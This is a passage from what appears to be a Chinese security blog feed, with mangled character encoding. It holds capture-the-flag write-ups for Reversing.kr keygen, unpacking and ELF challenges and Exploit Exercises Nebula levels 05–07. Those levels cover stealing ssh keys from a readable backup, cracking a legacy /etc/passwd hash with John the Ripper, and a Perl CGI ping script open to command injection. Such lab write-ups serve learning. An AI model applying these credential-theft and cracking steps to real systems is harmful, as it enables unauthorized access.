004010A2  |.  45            |inc ebp
004010A3  |.  8D7C24 10     |lea edi,dword ptr ss:[esp+10]
004010A7  |.  83C9 FF       |or ecx,FFFFFFFF
004010AA  |.  33C0          |xor eax,eax
004010AC  |.  46            |inc esi
004010AD  |.  F2:AE         |repne scas byte ptr es:[edi]
004010AF  |.  F7D1          |not ecx
004010B1  |.  49            |dec ecx
004010B2  |.  3BE9          |cmp ebp,ecx
004010B4  |.^ 7C C1         \jl short Easy_Key.00401077
004010B6  |&amp;gt;  B9 19000000   mov ecx,19
004010BB  |.  33C0          xor eax,eax
004010BD  |.  8D7C24 10     lea edi,dword ptr ss:[esp+10]
004010C1  |.  68 44804000   push Easy_Key.00408044                   ;  Input Serial:
004010C6  |.  F3:AB         rep stos dword ptr es:[edi]

...

0040111A  |.  68 38804000   push Easy_Key.00408038                   ;  Correct!\n
0040111F  |.  E8 95000000   call Easy_Key.004011B9
00401124  |.  83C4 04       add esp,4
00401127  |.  33C0          xor eax,eax
00401129  |.  81C4 30010000 add esp,130
0040112F  |.  C3            retn
00401130  |&amp;gt;  68 30804000   push Easy_Key.00408030                   ;  Wrong\n
00401135  |.  E8 7F000000   call Easy_Key.004011B9
0040113A  |.  83C4 04       add esp,4
0040113D  |.  33C0          xor eax,eax
0040113F  |.  81C4 30010000 add esp,130
00401145  \.  C3            retn
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;åœ¨&lt;code&gt;00401059&lt;/code&gt;å³InputFunctionå¤„è¾“å…¥æµ‹è¯•ç”¨çš„Nameï¼šabcdeï¼Œå¹¶å›è½¦ã€‚ä¹‹åç¨‹åºè·‘åˆ°&lt;code&gt;004010C1&lt;/code&gt;å³InputSerialå¤„ï¼ŒæŸ¥çœ‹æ ˆæ•°æ®ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;0018FDEC   00000005
0018FDF0   0018FF88
0018FDF4   004011B5  Easy_Key.004011B5
0018FDF8   00000004
0018FDFC   0040109F  Easy_Key.0040109F
0018FE00   0018FE84  ASCII &amp;quot;7142537445&amp;quot;
0018FE04   00408054  ASCII &amp;quot;%s%02X&amp;quot;
0018FE08   0018FE84  ASCII &amp;quot;7142537445&amp;quot;
0018FE0C   00000045
0018FE10   00000000
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å¯ä»¥çœ‹åˆ°å½“Nameä¸ºabcdeçš„æ—¶å€™ï¼Œæ ˆåœ¨InputSerialå‰æœ‰æ•°æ®&lt;code&gt;ASCII "7142537445"&lt;/code&gt;å‡ºç°ã€‚é€šè¿‡InputSerialä¹‹åç¨‹åºé€»è¾‘å¯ä»¥çœ‹å‡ºï¼Œè¿™æ®µå­—ç¬¦ä¸²å°±æ˜¯æ ¹æ®abcdeç®—å‡ºçš„åºåˆ—å·ï¼Œå¹¶ç”¨è¿™ä¸ªåºåˆ—å·å’Œè¾“å…¥çš„åºåˆ—å·åšå¯¹æ¯”ã€‚å› æ­¤åºåˆ—å·ç®—æ³•åœ¨è¾“å…¥åå­—åã€è¾“å…¥åºåˆ—å·ä¹‹å‰(&lt;code&gt;0040105E&lt;/code&gt;-&lt;code&gt;004010B4&lt;/code&gt;)ã€‚&lt;/p&gt;
&lt;p&gt;è¿™æ®µç¨‹åºè¿˜åŸæˆC++ä»£ç ååŸºæœ¬å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;string&amp;gt;
using namespace std;

void main(void)
{
    char num[3] = {0x10, 0x20, 0x30};
    char* name = &amp;quot;abcde&amp;quot;;
    int len = strlen(name) * 2 + 1;
    char* serial = new char[len];
    memset(serial, 0, len);

    for(int i = 0, j = 0; j &amp;lt; strlen(name); i++, j++)
    {
        if(i &amp;gt;= 3)
            i = 0;
        sprintf(serial, &amp;quot;%s%02x&amp;quot;, serial, *(name + j) ^ num[i]);
    }

    cout&amp;lt;&amp;lt;serial&amp;lt;&amp;lt;endl;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å› æ­¤å¯ä»¥å†™å‡ºåå‡½æ•°ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;string&amp;gt;
using namespace std;

void main(void)
{
    char num[3] = {0x10, 0x20, 0x30};
    char* serial = &amp;quot;7142537445&amp;quot;;
    int len = strlen(serial) / 2 + 1;
    char* name = new char[len];
    memset(name, 0, len);

    for(int i = 0, j = 0; j &amp;lt; strlen(serial); i++, j = j + 2)
    {
        if(i &amp;gt;= 3)
            i = 0;

        char serial_str[3];
        serial_str[0] = *(serial + j);
        serial_str[1] = *(serial + j + 1);
        serial_str[2] = '\0';

        sprintf(name, &amp;quot;%s%c&amp;quot;, name, strtol(serial_str, NULL, 16) ^ num[i]);
    }

    cout&amp;lt;&amp;lt;name&amp;lt;&amp;lt;endl;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;æŠŠserialç”¨5B134977135E7D13å¸¦å…¥è·‘å‡ºæ¥Nameä¸ºK3yg3nm3ã€‚&lt;/p&gt;
&lt;h1&gt;Easy Unpack&lt;/h1&gt;
&lt;p&gt;readmeè¯´éœ€è¦æ‰¾OEPï¼Œä¹Ÿå°±æ˜¯ä¸ç”¨è„±å£³ï¼Œåªéœ€è¦æ‰¾å…¥å£ç‚¹ã€‚PEiDçœ‹ä¸€ä¸‹ï¼Œå£³ç±»å‹ä¸º&lt;code&gt;ARVID's TDR file [Overlay] *&lt;/code&gt;ã€‚æ‰ç–å­¦æµ…ï¼Œæ²¡çœ‹åˆ°è¿‡â€¦â€¦ä¸è¿‡æ—¢ç„¶æ˜¯Easy Unpackï¼Œæ–™ç€ä¹Ÿä¸ä¼šéš¾å€’å“ªé‡Œå»ã€‚&lt;/p&gt;
&lt;p&gt;æ‰“å¼€ODï¼Œè½½å…¥ç¨‹åºï¼Œå¿½ç•¥å„ç§é”™è¯¯ã€‚ç¨‹åºå¼€å§‹è½½å…¥kernel32ä¹‹åç”¨äº†LoadLibraryã€GetModuleHandleå’ŒFreeLibraryï¼Œå…¸å‹çš„åŒ…è£…äº†IATçš„å£³ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;0040A04B &amp;gt;  68 00A04000     push Easy_Unp.0040A000                   ; ASCII &amp;quot;kernel32.dll&amp;quot;
0040A050    FF15 0DA04000   call dword ptr ds:[&amp;lt;&amp;amp;kernel32.LoadLibrar&amp;gt;; kernel32.LoadLibraryA
0040A056    A3 44A64000     mov dword ptr ds:[40A644],eax
0040A05B    68 18A64000     push Easy_Unp.0040A618                   ; ASCII &amp;quot;GetModuleHandleA&amp;quot;
0040A060    50              push eax
0040A061    FF15 11A04000   call dword ptr ds:[&amp;lt;&amp;amp;kernel32.GetProcAdd&amp;gt;; apphelp.7054FFF6
0040A067    A3 48A64000     mov dword ptr ds:[40A648],eax
0040A06C    68 29A64000     push Easy_Unp.0040A629                   ; ASCII &amp;quot;FreeLibrary&amp;quot;
0040A071    FF35 44A64000   push dword ptr ds:[40A644]
0040A077    FF15 11A04000   call dword ptr ds:[&amp;lt;&amp;amp;kernel32.GetProcAdd&amp;gt;; apphelp.7054FFF6
0040A07D    A3 4CA64000     mov dword ptr ds:[40A64C],eax
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ä¹‹åæ˜¯å¾ˆé•¿ä¸€æ®µå¤–å£³æ“ä½œï¼Œç›´åˆ°ä¸€ä¸ªé•¿&lt;code&gt;jmp&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="x96asm"&gt;0040A082    6A 00           push 0
0040A084    FF15 48A64000   call dword ptr ds:[40A648]
0040A08A    A3 50A64000     mov dword ptr ds:[40A650],eax
0040A08F    B9 00904000     mov ecx,Easy_Unp.00409000
0040A094    BA EE944000     mov edx,Easy_Unp.004094EE
0040A099    3BCA            cmp ecx,edx
0040A09B    74 26           je short Easy_Unp.0040A0C3
0040A09D    8031 10         xor byte ptr ds:[ecx],10
0040A0A0    41              inc ecx
0040A0A1    3BCA            cmp ecx,edx
0040A0A3    74 1E           je short Easy_Unp.0040A0C3

...

0040A1ED    8031 40         xor byte ptr ds:[ecx],40
0040A1F0    41              inc ecx
0040A1F1    3BCA            cmp ecx,edx
0040A1F3    74 06           je short Easy_Unp.0040A1FB
0040A1F5    8031 50         xor byte ptr ds:[ecx],50
0040A1F8    41              inc ecx
0040A1F9  ^ EB D6           jmp short Easy_Unp.0040A1D1
0040A1FB  - E9 506FFFFF     jmp Easy_Unp.00401150
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ç¨‹åºå•æ­¥åˆ°0040A1FBä¹‹åï¼Œé•¿è·³åˆ°00401150ï¼Œå‘ç°äºŒè¿›åˆ¶æ•°æ®æ˜¯55ï¼Œæ¡ä»¶åå°„&lt;code&gt;push ebp&lt;/code&gt;ï¼Œå‡½æ•°å…¥å£ï¼Œäºæ˜¯Ctrl+Aå¼ºåˆ¶æ±‡ç¼–æ•°æ®ï¼Œç†Ÿæ‚‰çš„å…¥å£ç»“æ„æ¥äº†~~&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;00401150  /.  55            push ebp
00401151  |.  8BEC          mov ebp,esp
00401153  |.  6A FF         push -1
00401155  |.  68 D0504000   push Easy_Unp.004050D0
0040115A  |.  68 1C1E4000   push Easy_Unp.00401E1C                   ;  Entry address; SE å¤„ç†ç¨‹åºå®‰è£…
0040115F  |.  64:A1 0000000&amp;gt;mov eax,dword ptr fs:[0]
00401165  |.  50            push eax
00401166  |.  64:8925 00000&amp;gt;mov dword ptr fs:[0],esp
0040116D  |.  83EC 58       sub esp,58

...

004011BC  |&amp;gt;  8975 FC       mov [local.1],esi
004011BF  |.  E8 E1070000   call Easy_Unp.004019A5
004011C4  |.  FF15 38504000 call dword ptr ds:[405038]               ; [GetCommandLineA

...

004011EE  |.  50            push eax                                 ; /pStartupinfo
004011EF  |.  FF15 34504000 call dword ptr ds:[405034]               ; \GetStartupInfoA
004011F5  |.  E8 1B030000   call Easy_Unp.00401515

...

0040120C  |&amp;gt;  50            push eax
0040120D  |.  FF75 9C       push [local.25]
00401210  |.  56            push esi
00401211  |.  56            push esi                                 ; /pModule
00401212  |.  FF15 30504000 call dword ptr ds:[405030]               ; \GetModuleHandleA

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å› æ­¤OEPä¸º00401150ã€‚ç¡®å®éå¸¸ç®€å•~~&lt;/p&gt;
&lt;h1&gt;Easy ELF&lt;/h1&gt;
&lt;p&gt;ä¸‰é“Windowsä¹‹åæ¥äº†ä¸€é“Linuxï¼Œä¸è¿‡æ— æ‰€è°“å•¦ã€‚æ‹–åˆ°Linuxé‡Œé¢ï¼Œçœ‹ä¸€ä¸‹æ–‡ä»¶ç±»å‹ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;root@YYX-Kali:~/upload# file Easy_ELF 
Easy_ELF: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, BuildID[sha1]=0x409edb8e3182380a2f58d49c7323dd895c74e1b7, stripped
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;åŸºæœ¬ä¿¡æ¯å°±æ˜¯ELF32ä½å¯æ‰§è¡Œæ–‡ä»¶ï¼Œé“¾æ¥åŠ¨æ€åº“ï¼Œå»ç¬¦å·è¡¨ã€‚&lt;/p&gt;
&lt;p&gt;è¿è¡Œä¸€ä¸‹ç¨‹åºï¼Œéšä¾¿è¾“å…¥ä¸€ç‚¹ï¼Œæç¤º&lt;code&gt;Wrong&lt;/code&gt;åç›´æ¥é€€å‡ºã€‚åå¤è¯•äº†ä¸€äº›æ•°å­—ã€å­—æ¯ä¹‹ç±»çš„ç»„åˆï¼Œéƒ½æ˜¯ä¸€ä¸ªç»“æœã€‚&lt;/p&gt;
&lt;p&gt;æ‰“å¼€IDAï¼ˆWindowsä¸‹ï¼‰ï¼Œæ‹–å…¥ï¼Œå¼€å§‹é€†å‘åˆ†æã€‚ç›´æ¥&lt;code&gt;Shift+F12&lt;/code&gt;æ‰“å¼€å­—ç¬¦ä¸²çª—å£æ‰¾åˆ°æ‰¾åˆ°&lt;code&gt;Wrong&lt;/code&gt;ï¼Œä¹‹ååˆ©ç”¨äº¤å‰å¼•ç”¨è·³å›åˆ°è°ƒç”¨å‡½æ•°ï¼Œç¨å¾®å‘ä¸Šç¿»ä¸€ç‚¹å°±èƒ½çœ‹åˆ°å…³é”®å‡½æ•°äº†ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;.text:080484F7 ; =============== S U B R O U T I N E =======================================
.text:080484F7
.text:080484F7 ; Attributes: bp-based frame
.text:080484F7
.text:080484F7 sub_80484F7     proc near               ; CODE XREF: sub_804851B+34p
.text:080484F7                 push    ebp
.text:080484F8                 mov     ebp, esp
.text:080484FA                 sub     esp, 18h
.text:080484FD                 mov     dword ptr [esp+8], 9 ; n
.text:08048505                 mov     dword ptr [esp+4], offset aCorrect ; &amp;quot;Correct!\n&amp;quot;
.text:0804850D                 mov     dword ptr [esp], 1 ; fd
.text:08048514                 call    _write
.text:08048519                 leave
.text:0804851A                 retn
.text:0804851A sub_80484F7     endp
.text:0804851A
.text:0804851B
.text:0804851B ; =============== S U B R O U T I N E =======================================
.text:0804851B
.text:0804851B ; Attributes: bp-based frame
.text:0804851B
.text:0804851B sub_804851B     proc near               ; DATA XREF: start+17o
.text:0804851B                 push    ebp
.text:0804851C                 mov     ebp, esp
.text:0804851E                 and     esp, 0FFFFFFF0h
.text:08048521                 sub     esp, 10h
.text:08048524                 mov     dword ptr [esp+8], 17h ; n
.text:0804852C                 mov     dword ptr [esp+4], offset aReversing_krEa ; &amp;quot;Reversing.Kr Easy ELF\n\n&amp;quot;
.text:08048534                 mov     dword ptr [esp], 1 ; fd
.text:0804853B                 call    _write
.text:08048540                 call    sub_8048434              ; scanf
.text:08048545                 call    sub_8048451              ; main algorithm
.text:0804854A                 cmp     eax, 1
.text:0804854D                 jnz     short loc_804855B
.text:0804854F                 call    sub_80484F7              ; correct
.text:08048554                 mov     eax, 0
.text:08048559                 jmp     short locret_804857C
.text:0804855B ; ---------------------------------------------------------------------------
.text:0804855B
.text:0804855B loc_804855B:                            ; CODE XREF: sub_804851B+32j
.text:0804855B                 mov     dword ptr [esp+8], 6 ; n
.text:08048563                 mov     dword ptr [esp+4], offset aWrong ; &amp;quot;Wrong\n&amp;quot;
.text:0804856B                 mov     dword ptr [esp], 1 ; fd
.text:08048572                 call    _write
.text:08048577                 mov     eax, 0
.text:0804857C
.text:0804857C locret_804857C:                         ; CODE XREF: sub_804851B+3Ej
.text:0804857C                 leave
.text:0804857D                 retn
.text:0804857D sub_804851B     endp
.text:0804857D
.text:0804857D ; ---------------------------------------------------------------------------
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;sub_804851Bå‡½æ•°æ˜¯æç¤ºæ­£ç¡®ä¸é”™è¯¯çš„åˆ†æ”¯å‡½æ•°ï¼Œå…¶ä¸­å››ä¸ªcallï¼Œwriteè¯†åˆ«å‡ºæ¥äº†ï¼Œå…¶ä»–å‡½æ•°è·Ÿè¿›å»çœ‹ä¸€ä¸‹ï¼ˆæˆ‘å·²ç»æ³¨é‡Šï¼‰ï¼Œå‘ç°æ˜¯scanfã€ä¸»ç®—æ³•å‡½æ•°å’Œè¿”å›Correctå­—ç¬¦ä¸²çš„å‡½æ•°ï¼Œå…¶ä¸­å½“ä¸»ç®—æ³•å‡½æ•°è¿”å›1æ—¶åˆ¤ä¸ºæ­£ç¡®ã€‚&lt;/p&gt;
&lt;p&gt;ç„¶åå°±é‡ç‚¹æ¥çœ‹sub_8048451ã€‚è½¬åˆ°å›¾å½¢è§†å›¾ï¼Œä¸€ç»„è¿ç»­åˆ¤æ–­ï¼Œåªè¦é€»è¾‘æ²¿ç€å³è¾¹ä¸‹æ¥å³å¯èµ°é€šï¼ˆæœ€åeaxä¸º1ï¼Œç¬¦åˆä¸Šé¢çš„åˆ¤å¯¹æ¡ä»¶ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src="../statics/reversing-kr-4-easy-challenges/2014-09-13_153330.jpg" /&gt;&lt;/p&gt;
&lt;p&gt;ä¹‹åå¤§è‡´æ‰«æäº†ä¸€ä¸‹ç¨‹åºä½“ï¼Œå‘ç°åå¤è°ƒç”¨dsæ®µå¯„å­˜å™¨æŒ‡å‘çš„æ®µå†…çš„ä¸€äº›byteï¼Œç‚¹è¿›å»çœ‹ä¸€ä¸‹æ•°æ®åŒºå¸ƒå±€ï¼ˆåœ¨.bssæ®µï¼Œå…¨å±€å˜é‡ï¼‰ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;.bss:0804A020 byte_804A020    db ?                    ; DATA XREF: sub_8048434+Bo
.bss:0804A020                                         ; sub_8048451:loc_8048469r ...
.bss:0804A021 byte_804A021    db ?                    ; DATA XREF: sub_8048451+3r
.bss:0804A022 byte_804A022    db ?                    ; DATA XREF: sub_8048451+27r
.bss:0804A022                                         ; sub_8048451+31w ...
.bss:0804A023 byte_804A023    db ?                    ; DATA XREF: sub_8048451+36r
.bss:0804A023                                         ; sub_8048451+40w ...
.bss:0804A024 byte_804A024    db ?                    ; DATA XREF: sub_8048451+45r
.bss:0804A025 byte_804A025    db ?                    ; DATA XREF: sub_8048451:loc_80484A8r
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;è¿™æ®µéƒ½æ˜¯è¢«å¼•ç”¨æ•°æ®ï¼Œä¸”æ˜¯è¿ç»­çš„ï¼Œå„1byteï¼Œä½ å¯ä»¥æŠŠå®ƒä»¬æ ¼å¼åŒ–æˆæ•°ç»„ï¼Œæˆ‘æ¯”è¾ƒæ‡’ï¼Œå°±ä¸åšè¿™æ­¥äº†ã€‚åŸºæœ¬å¯ä»¥ç¡®è®¤æ•°æ®åŒºä¸ºè¿ç»­çš„6ä¸ªbyteï¼Œå³[20][21][22][23][24][25]ã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹é¢è¿›è¡Œä¸»ç®—æ³•å…·ä½“é€»è¾‘åˆ†æï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;.text:08048451 sub_8048451     proc near               ; CODE XREF: sub_804851B+2Ap
.text:08048451                 push    ebp
.text:08048452                 mov     ebp, esp
.text:08048454                 movzx   eax, ds:byte_804A021
.text:0804845B                 cmp     al, 31h
.text:0804845D                 jz      short loc_8048469
.text:0804845F                 mov     eax, 0
.text:08048464                 jmp     loc_80484F5
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ç¬¬ä¸€æ®µç¡®å®š[21]ç­‰äº0x31ï¼Œå°±æ˜¯'1'ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;.text:08048469 loc_8048469:                            ; CODE XREF: sub_8048451+Cj
.text:08048469                 movzx   eax, ds:byte_804A020
.text:08048470                 xor     eax, 34h
.text:08048473                 mov     ds:byte_804A020, al
.text:08048478                 movzx   eax, ds:byte_804A022
.text:0804847F                 xor     eax, 32h
.text:08048482                 mov     ds:byte_804A022, al
.text:08048487                 movzx   eax, ds:byte_804A023
.text:0804848E                 xor     eax, 0FFFFFF88h
.text:08048491                 mov     ds:byte_804A023, al
.text:08048496                 movzx   eax, ds:byte_804A024
.text:0804849D                 cmp     al, 58h
.text:0804849F                 jz      short loc_80484A8
.text:080484A1                 mov     eax, 0
.text:080484A6                 jmp     short loc_80484F5
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ç¬¬äºŒæ®µåšäº†è¿ç»­å¼‚æˆ–ï¼Œ[20] xor 0x34, [22] xor 0x32, [23] xor 0x88, ä¹‹ååˆ¤æ–­[23]æ˜¯ä¸æ˜¯ä¸º0x58ï¼Œæ‰€ä»¥[23]ä¸º'X'ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;.text:080484A8 loc_80484A8:                            ; CODE XREF: sub_8048451+4Ej
.text:080484A8                 movzx   eax, ds:byte_804A025
.text:080484AF                 test    al, al
.text:080484B1                 jz      short loc_80484BA
.text:080484B3                 mov     eax, 0
.text:080484B8                 jmp     short loc_80484F5
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ç¬¬ä¸‰æ®µè¦æ±‚[25]ä¸º0ï¼Œå°±æ˜¯'\0'ï¼Œå­—ç¬¦ä¸²ç»“å°¾ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;.text:080484BA
.text:080484BA loc_80484BA:                            ; CODE XREF: sub_8048451+60j
.text:080484BA                 movzx   eax, ds:byte_804A022
.text:080484C1                 cmp     al, 7Ch
.text:080484C3                 jz      short loc_80484CC
.text:080484C5                 mov     eax, 0
.text:080484CA                 jmp     short loc_80484F5
.text:080484CC ; ---------------------------------------------------------------------------
.text:080484CC
.text:080484CC loc_80484CC:                            ; CODE XREF: sub_8048451+72j
.text:080484CC                 movzx   eax, ds:byte_804A020
.text:080484D3                 cmp     al, 78h
.text:080484D5                 jz      short loc_80484DE
.text:080484D7                 mov     eax, 0
.text:080484DC                 jmp     short loc_80484F5
.text:080484DE ; ---------------------------------------------------------------------------
.text:080484DE
.text:080484DE loc_80484DE:                            ; CODE XREF: sub_8048451+84j
.text:080484DE                 movzx   eax, ds:byte_804A023
.text:080484E5                 cmp     al, 0DDh
.text:080484E7                 jz      short loc_80484F0
.text:080484E9                 mov     eax, 0
.text:080484EE                 jmp     short loc_80484F5
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ä¹‹åè¿ç»­ä¸‰æ®µå¯¹åˆšæ‰å¼‚æˆ–åçš„æ•°å­—è¿›è¡Œæ“ä½œã€‚å¼‚æˆ–çš„åå‡½æ•°è¿˜æ˜¯å¼‚æˆ–ï¼Œæ‰€ä»¥ç›´æ¥å¼‚æˆ–å°±èƒ½å¾—åˆ°ç»“æœã€‚è¿™é‡Œç”¨pythonè®¡ç®—ä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="python"&gt;&amp;gt;&amp;gt;&amp;gt; chr(0x32 ^ 0x7c)
'N'
&amp;gt;&amp;gt;&amp;gt; chr(0x34 ^ 0x78)
'L'
&amp;gt;&amp;gt;&amp;gt; chr(0x88 ^ 0xdd)
'U'`
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;æ‰€ä»¥[20]=Lï¼Œ[22]=Nï¼Œ[23]=Uã€‚&lt;/p&gt;
&lt;p&gt;æœ€åeaxç½®1å¹¶è¿”å›ã€‚è¿™æ ·å¯ä»¥å¾—åˆ°ç­”æ¡ˆä¸º&lt;code&gt;L1NUX&lt;/code&gt;ã€‚&lt;/p&gt;</summary><category term="reversing.kr"></category><category term="wargame"></category><category term="hacking"></category><category term="reversing"></category></entry><entry><title>Exploit Exercises Nebula level05-09 Writeup</title><link href="http://blog.yyx.name/posts/exploit-exercises-nebula-level-05-09.html" rel="alternate"></link><updated>2014-09-08T19:18:00+08:00</updated><author><name>GreatYYX</name></author><id>tag:blog.yyx.name,2014-09-08:posts/exploit-exercises-nebula-level-05-09.html</id><summary type="html">&lt;h1&gt;Nebula level05&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Check the flag05 home directory. You are looking for weak directory permissions&lt;/p&gt;
&lt;p&gt;åœ¨flag05å®¶ç›®å½•ä¸‹æ‰¾å¼±æƒé™æ§åˆ¶ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ç›´æ¥æŸ¥flag05çš„homeç›®å½•ï¼Œå‘ç°.backupå’Œ.sshæ–‡ä»¶å¾ˆå¯ç–‘ï¼Œ.sshæ²¡æƒé™ï¼Œé‚£å°±.backupã€‚è¿›å»ä¹‹åå‘ç°ä¸€ä¸ª.tgzæ–‡ä»¶ï¼Œè§£å‹ä¹‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;tar zxf /home/flag05/.backup/backup-19072011.tgz -C ~/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;æ­¤æ—¶åœ¨è‡ªå·±å®¶ç›®å½•ä¸‹ä¹Ÿæœ‰.sshæ–‡ä»¶å¹¶å…·æœ‰äº†flag05çš„sshç™»é™†å…¬ç§é’¥ï¼Œè¿™æ ·å°±å¯ä»¥ç›´æ¥ç”¨flag05æ— å¯†ç ç™»é™†äº†ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;ssh flag05@localhost
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ä½ éƒ½æ˜¯flag05äº†ï¼Œåšä»€ä¹ˆçŸ¥é“äº†å§~~&lt;/p&gt;
&lt;h1&gt;Nebula level06&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;The flag06 account credentials came from a legacy unix system.&lt;/p&gt;
&lt;p&gt;é¢˜ç›®è¯´flag06è´¦æˆ·ä»¤ç‰Œçš„å½¢å¼ç»§æ‰¿äºå·²ç»è¢«æ”¾å¼ƒçš„Unixã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Unixæ²¡ç”¨è¿‡ï¼Œå¥½æƒ­æ„§ï¼Œä¹Ÿä¸çŸ¥é“ä»€ä¹ˆéªŒè¯çš„å½¢å¼ï¼Œåæ­£æˆ‘å°±ç›´æ¥&lt;code&gt;cat /etc/passwd | more&lt;/code&gt;äº†ï¼Œç„¶åå‘ç°ï¼Œflag06è´¦æˆ·çš„å¯†ç å­—æ®µä¸æ˜¯&lt;code&gt;x&lt;/code&gt;è€Œæ˜¯ç›´æ¥ä¸€å †å€¼ã€‚Googleä¸€ä¸‹å‘ç°ï¼Œå› ä¸ºpasswdçš„ræƒé™å¤ªé«˜ï¼ˆä¸»è¦å¾ˆå¤šç¨‹åºæŠŠå®ƒå½“ç”¨æˆ·æ•°æ®è¡¨ï¼‰ï¼Œå› æ­¤Linuxé‡‡ç”¨shadowå­˜æ”¾å¯†ç ï¼Œè¿™æ ·passwdé‡Œå°±å˜æˆxäº†ï¼ˆå…¶å®è€å¸ˆè¯´è¿‡çš„ï¼Œä½†æ˜¯å› ä¸ºç°åœ¨éƒ½æ˜¯xï¼Œæ‰€ä»¥ä¹Ÿå°±æ²¡ç•™æ„è¿™ä¸ªé—®é¢˜ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;OKï¼Œæ—¢ç„¶æ‹¿åˆ°äº†flag06å¯†ç çš„å¯†æ–‡ï¼Œé‚£å°±ç ´è§£å‘—ã€‚ä¸ŠKaliæˆ–è€…BackTracer5ï¼Œæ²¡è¿™äº›ç³»ç»Ÿçš„éœ€è¦ä¸‹è½½å¹¶ç¼–è¯‘&lt;a href="http://www.openwall.com/john/"&gt;John the ripper&lt;/a&gt;æ¥è·‘å­—å…¸ã€‚æˆ‘åœ¨Kaliç¯å¢ƒä¸­ï¼ŒæŠŠå¯†ç é‚£æ®µå­—ç¬¦ä¸²&lt;code&gt;ueqwOCnSGdsuM&lt;/code&gt;å†™å…¥/rootç›®å½•ä¸‹çš„flag06passwdæ–‡ä»¶ä¸­ï¼ˆä½ ä¹Ÿå¯ä»¥å†™æ•´ä¸ªflag06åœ¨passwdä¸­çš„é‚£è¡Œï¼‰ï¼Œä¹‹åï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;john ~/flag06passwd
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;åŸºæœ¬ä¸Šç¬é—´å°±è·‘å‡ºæ¥å¯†ç æ˜¯helloï¼ˆèµ¤è£¸è£¸çš„å¼±å£ä»¤å‘€ï¼‰ï¼Œç™»é™†flag06å»çˆ½å§ã€‚&lt;/p&gt;
&lt;h1&gt;Nebula level07&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.&lt;/p&gt;
&lt;p&gt;ä¸€ä¸ªperlè„šæœ¬ï¼Œè„šæœ¬å®ç°äº†pingä¸»æœºçš„åŠŸèƒ½ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class="perl"&gt;#!/usr/bin/perl
use CGI qw{param};

print &amp;quot;Content-type: text/html\n\n&amp;quot;;

sub ping {
  $host = $_[0];

  print(&amp;quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Ping results&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;pre&amp;gt;&amp;quot;);

  @output = `ping -c 3 $host 2&amp;gt;&amp;amp;1`;
  foreach $line (@output) { print &amp;quot;$line&amp;quot;; } 

  print(&amp;quot;&amp;lt;/pre&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&amp;quot;);

}

# check if Host set. if not, display normal page, etc
ping(param(&amp;quot;Host&amp;quot;));
&lt;/code&gt;&lt;/pre&gt;

